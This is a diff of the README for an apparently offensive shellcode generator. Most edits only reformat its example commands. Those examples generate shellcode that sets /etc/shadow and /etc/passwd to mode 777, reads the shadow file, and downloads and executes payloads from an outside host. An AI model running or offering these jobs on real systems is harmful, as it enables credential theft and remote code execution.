@@ -55,13 +55,13 @@ version 1.0.4: Infinity
 Examples
 ---------------
 
-python shellcoder.py -os linux_x86 -encode inc -job chmod('/etc/passwd','777') -o file
+`python shellcoder.py -os linux_x86 -encode inc -job chmod('/etc/passwd','777') -o file`
 
-python shellcoder.py -os linux_x86 -encode dec -job chmod('/etc/passwd','777') -o file
+`python shellcoder.py -os linux_x86 -encode dec -job chmod('/etc/passwd','777') -o file`
 
-python shellcoder.py -os linux_x86 -encode inc_10 -job chmod('/etc/passwd','777') -o file
+`python shellcoder.py -os linux_x86 -encode inc_10 -job chmod('/etc/passwd','777') -o file`
 
-python shellcoder.py -os linux_x86 -encode dec_30 -job chmod('/etc/passwd','777') -o file
+`python shellcoder.py -os linux_x86 -encode dec_30 -job chmod('/etc/passwd','777') -o file`
 
 Note: you also can use high value for inc and dec time, like inc_100000, your shellcode may get too big
 
@@ -78,25 +78,26 @@ version 1.0.3: AWAKE
 
 Examples 
 ---------
-python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/shadow','777') -o file.txt
 
-python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/passwd','444') -o file.txt
+`python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/shadow','777') -o file.txt`
+
+python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/passwd','444') -o file.txt`
 
 Note: each time you execute chmod() function with random encode, you are gonna get random outputs and different shellcode.
 
-python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job chmod('/etc/shadow','777') -o file.txt
+`python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job chmod('/etc/shadow','777') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode xor_0x45872f4d -job chmod('/etc/passwd','444') -o file.txt
+`python shellcoder.py -os linux_x86 -encode xor_0x45872f4d -job chmod('/etc/passwd','444') -o file.txt`
 
 Note: your xor value could be anything. "xor_0x41414141" and "xor_0x45872f4d" are examples.
 
-python shellcoder.py -os linux_x86 -encode add_random -job chmod('/etc/passwd','444') -o file.txt
+`python shellcoder.py -os linux_x86 -encode add_random -job chmod('/etc/passwd','444') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode add_0x41414141 -job chmod('/etc/passwd','777') -o file.txt
+`python shellcoder.py -os linux_x86 -encode add_0x41414141 -job chmod('/etc/passwd','777') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode sub_random -job chmod('/etc/passwd','777') -o file.txt
+`python shellcoder.py -os linux_x86 -encode sub_random -job chmod('/etc/passwd','777') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode sub_0x41414141 -job chmod('/etc/passwd','444') -o file.txt
+`python shellcoder.py -os linux_x86 -encode sub_0x41414141 -job chmod('/etc/passwd','444') -o file.txt`
 
 
 
@@ -113,25 +114,25 @@ add encodes file for next version released
 Examples
 --------
 
-python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello.txt','hello') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello.txt','hello') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello2.txt','hello[space]world[space]!') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello2.txt','hello[space]world[space]!') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job dir_create('/root/Desktop/mydirectory') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job dir_create('/root/Desktop/mydirectory') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job download('http://www.z3r0d4y.com/exploit.type','myfile.type') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job download('http://www.z3r0d4y.com/exploit.type','myfile.type') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type') -o file.txt`
 
 multi command:
 
-python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job script_executor('script.type','D:\\myfile.type','./script.type') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job script_executor('script.type','D:\\myfile.type','./script.type') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py') -o file.txt`
 
 Note: Remember don't use " " and replace it with "[space]"
 
@@ -155,13 +156,13 @@ system() function added in script, you can use it to do anything and generate an
 
 Note: Don't use space ' ' in system() function, replace it with "[space]" , software will detect and replace " " for you in shellcode.
 
-python shellcoder.py -os linux_x86 -encode none -job system('ls') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job system('ls') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file') -o file.txt`
 
-python shellcoder.py -os linux_x86 -encode none -job system('wget[space]file;sh[space]file') -o file.txt
+`python shellcoder.py -os linux_x86 -encode none -job system('wget[space]file;sh[space]file') -o file.txt`
 
 
 version 1.0.0: ASIIN_BLUE_RUBY
@@ -178,8 +179,8 @@ version 1.0.0: ASIIN_BLUE_RUBY
 Examples
 --------
 
-python shellcoder.py -h 
-
+python shellcoder.py -h
+-----------------------
 
 Switches:
 
@@ -203,6 +204,7 @@ Switches:
 
 
 python shellcoder.py -oslist
+----------------------------
 
 [+] linux_x86
 
@@ -228,6 +230,7 @@ python shellcoder.py -oslist
 
 
 python shellcoder.py -joblist
+-----------------------------
 
 [+] exec('/path/file')
 
@@ -249,6 +252,7 @@ python shellcoder.py -joblist
 
 
 python shellcoder.py -types
+---------------------------
 
 [+] none
 
